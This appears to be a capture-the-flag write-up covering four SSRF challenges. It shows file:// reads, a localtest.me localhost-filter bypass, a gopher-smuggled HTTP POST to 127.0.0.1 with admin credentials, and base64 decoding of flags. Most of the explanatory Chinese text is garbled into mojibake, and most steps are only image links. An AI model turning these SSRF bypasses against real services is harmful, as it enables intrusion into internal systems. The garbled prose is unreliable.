# SRF01
����file�s�W�h�ɮצ�m
![](image-1.png)
![alt text](image-2.png)

�A�h�ݬݭ�l�X�A�L�N�������Obase64�s�X�F�A�N������ѽX��
![alt text](image-6.png)
### flag�NBOOM�X�ӤF 

# SRF02
![alt text](image-3.png)
�]�������file�ҥH���http�s���A��
![alt text](image-4.png)
![alt text](image-5.png)

�M��N�|�o�{��Ĥ@�D�S�O�@�˪�~~���B~~

# SRF03
�o�D���S�O�A�ڳ̫�O��payload list�����}�@�Ӥ@��~~�q�F~~�X�ӫ�o�{ ```http://localtest.me/local```�O�i�H��

![alt text](image-7.png)
![alt text](image-8.png)
![alt text](image-9.png)
�̫�̵M�O���藍�|�߱�ڭ̪�base64

# SRF04

�ק�burp�X�Ӫ��ʥ]�A���H�U

```
_POST /local HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://ctfd-ais3.crazyfirelee.tw:9074
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 32

username=admin&password=password
 ```

�A�Hurl��X

![alt text](image-10.png)

�A�ӴN�u���q�F�ոլ�gopher���覡�s�u
![alt text](image-11.png)

�A�ݬݭ�l�X�N���F�Q���x��base64�s�X�L��response�ʥ]
![alt text](image-12.png)

�̫�Hbase64�ѽX�^�ڭ̬ݱo�����ʥ]
![alt text](image-13.png)